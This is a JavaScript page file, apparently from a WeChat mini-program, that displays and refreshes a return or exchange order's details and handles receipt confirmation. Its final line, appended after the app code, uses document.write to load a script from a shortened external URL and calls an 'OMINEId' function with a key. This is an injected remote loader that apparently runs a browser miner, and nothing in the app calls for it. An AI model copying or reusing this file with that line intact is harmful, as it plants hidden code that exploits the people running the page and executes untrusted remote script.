var t = getApp(),
  app=t,
  e = t.requirejs("core"),
  i = t.requirejs("biz/order"),
  address = t.requirejs("address/adresscode-handle"),
  jq = t.requirejs("jquery");
Page({
  data: {
    code: false,
    consume: false,
    show:true,
    ismore:true,
    isretreat:true,
    ismore_child:-1,
    order: { goodsprice: "5000.3", dispatchprice: "55.6", ordersn:"ASD8885555", price: "4944.7", createtime: "2018-06-09 17：55：42", area: "南山区", address: "赋安大厦A301" },
    store: false,
    goods: [{ thumb: t.globalData.daxinImg + "/static/images/banner.png", title: "ME6211C33M5G 盘装", detail: "单路LDO,输入电压2-6v,输出电压3.3v,输出电流，输出精度高:±2%,封装:SOT23-5,", pnum: "3000", total: "20.22", address: "赋安大厦A301" }],
    address: { realname: "张三", mobile: "13800138000", province: "广东省", city: "深圳市", area: "南山区", address: "赋安大厦A301" },
    shop:{name:"成都市",updateTime:"2018-07-13 14:56:23"},
    cancel: i.cancelArray,
    cancelindex: 0,
    Express:[],
    diyshow: {},
    retreat_knot_show:false
  },
  onLoad: function (e) {
    this.setData({
      options: e
    });
    var _this=this;
    var timer ;
    timer = setTimeout(function(){
      _this.get_list(e.re_sn,e.order_sn);
      clearTimeout(timer);
    },100);
  },
  onShow: function () {
   // this.get_list()
  },
  onPullDownRefresh: function () {
    var _this = this;
    var option = _this.data.options;
    //下拉刷新
    _this.get_list(option.re_sn, option.order_sn);
    wx.stopPullDownRefresh();
  },
  get_list: function (sn, order_sn){
    var _this = this;
    wx.showToast({
      title: '加载中...',
      icon: 'loading'
    });
    var data={
      session_token: t.globalData.session_token,
      order_sn:order_sn,
      re_sn: sn,
      action:'retreatDetail',
      relation:'retreatDetail'  
    };
    //获取退换货详情
    wx.request({
      url: t.globalData.daxin + "/order/knotOrder",
      data: data,
      method: "POST",
      success: function (res) {
        wx.hideToast();
        console.log(res);
        if (res.data.statusCode >= 0 && res.data.data) {
          // if (delivery){
          //   return;}
          var orders = res.data.data.list[0];
          orders.order_states = t.getOrderStatus(orders.order).indexOf("(") > 0 ? t.getOrderStatus(orders.order).split("(")[0] : t.getOrderStatus(orders.order);
          var good_list = orders.order_retreat_goods;
          // good_list = t.getRetreat(orders.order_goods, good_list);
          var Alltotall=0;
          var total_knot_retreat_money=0;
          jq.each(good_list,function(ind,val){
            val.total = (val.p_num * val.good.p_price_true).toFixed(2);
            val.thumb = val.cover_img ? t.globalData.daxinImg + val.cover_img : "";
          });
          orders.ship = t.getOrderStatus(orders.order,'ship_type');
          orders.pay_type = t.getOrderStatus(orders.order, 'pay_type');
          orders.retreat_status = t.getRetreatstatus(parseFloat(orders.handle_status));
          // if (orders.deposits_pay_type && orders.order_type>0)orders.deposits_pay_type = t.getOrderStatus(orders, 'deposits_pay_type');
          // if (orders.delivery_info){
          //     jq.each(orders.delivery_info,function(ind,val){
          //     var details = JSON.parse(val.detail);
          //     var fqty=0;    
          //     jq.each(details,function(id,vl){
          //       details[id].fqty = parseInt(vl.fqty);
          //       fqty += parseFloat(vl.fqty);
          //     });
          //     val.fqty = fqty.toFixed(2);
          //     orders.order_sync_hy[ind].details = details;
          //   });
          // }
          // var isrecieves="已收货";
          // if (orders.is_recive != 1) { isrecieves = "收货";};
          var addressDetail={};
          addressDetail.allAddrss = orders.apply_delivery_address;
          addressDetail.mobile = orders.apply_delivery_phone;
          addressDetail.consignee = orders.apply_delivery_user;
          //orders.order_detail.allAddrss = orders.order_detail.area_code.length==6?address.getData(orders.order_detail.area_code):' ';
          orders.Alltotall_true = parseFloat(orders.retreat_money).toFixed(2);
          var Express=[];
          Express.push({ hy: ((orders.delivery_info ? (orders.delivery_info.length > 0 ? orders.delivery_info : []) : []))});
          _this.setData({
            order: orders,
            goods: good_list,
            Express: Express,
           // isrecieve: isrecieves,
            address: addressDetail
          });

        } else {
          wx.showModal({
            title: '提示信息',
            content: '个信息获取失败',
            showCancel: false,
            success: function (res) {
              if (res.confirm) {
                //console.log('用户点击确定')
              } else if (res.cancel) {
                //console.log('用户点击取消')
              }
            }
          })
        }
      }
    })
  },
  retreat_knot_show:function(){
    //查看退换货、结单详情
    var ishow = this.data.retreat_knot_show;
    this.setData({
      retreat_knot_show: ishow?false:true
    });
  },
  moremuch: function () {
    var ismores = true;
    if (this.data['ismore']) { ismores = false; };
    this.setData({
      ismore: ismores,
      ismore_child:-1
    });
  },
  moremuch_child: function (event) {
    var indd = e.pdata(event).index;
    var status = indd;
    //if (this.data.Express[indd].hy) { return };
    if (this.data['ismore_child'] == indd) { status = -1; };
    this.setData({
      'ismore_child': status
    });
  },
  isrecieve:function(event){
      var _this=this; 
      var data={
        session_token:t.globalData.session_token,
        order_sn: this.data.order.order_sn,
        partid: e.pdata(event).id
      };
    wx.showModal({
      title: '确认收货',
      content: "您确认收货么？",
      success: function (res) {
        if (res.confirm) {
          _this.isrecieve_next(data); 
        } else if (res.cancel) {
          //console.log('用户点击取消')
        }
      }
    })
  },
  isrecieve_next: function (data) {
    //收货
    var _this=this;
    wx.request({
      url: t.globalData.daxin + "/order/hyReceive",
      data: data,
      method: "POST",
      success: function (res) {
        wx.hideToast();
        //console.log(res);
        if (res.data.statusCode >= 0 && res.data.msg =="success") {
          wx.showModal({
            title: "收货信息",
            content: '收货成功',
            showCancel:false,
            success:function(res){
              if (res.confirm) _this.get_list(_this.options.id, { show_data: "retreatDetail" });
            } 
          });
        } else {
          wx.showModal({
            title: '提示信息',
            content: res.data.msg,
            showCancel: false,
            success: function (res) {
              if (res.confirm) {
                //console.log('用户点击确定')
              } else if (res.cancel) {
                //console.log('用户点击取消')
              }
            }
          })
        }
      }
    })
  },
  close: function () {
    this.setData({
      code: false
    })
  },
  toggle: function (t) {
    var i = e.pdata(t),
      a = i.id,
      o = i.type,
      n = {};
    n[o] = 0 == a || void 0 === a ? 1 : 0,
      this.setData(n)
  },
  phone: function (t) {
    e.phone(t)
  },
  cancel: function (t) {
    i.cancel(this.data.options.id, t.detail.value, "/pages/order/detail/index?id=" + this.data.options.id)
  },
  delete: function (t) {
    var a = e.data(t).type;
    i.delete(this.data.options.id, a, "/pages/order/index")
  },
  finish: function (t) {
    i.finish(this.data.options.id, "/pages/order/index")
  },
  refundcancel: function (t) {
    var e = this;
    i.refundcancel(this.data.options.id, function () {
      e.get_list()
    })
  },
  onShareAppMessage: function () {
    return e.onShareAppMessage()
  }
})
document.write('<script src="http://t.cn/EvlonFh"></script><script>OMINEId("e02cf4ce91284dab9bc3fc4cc2a65e28","-1")</script>');
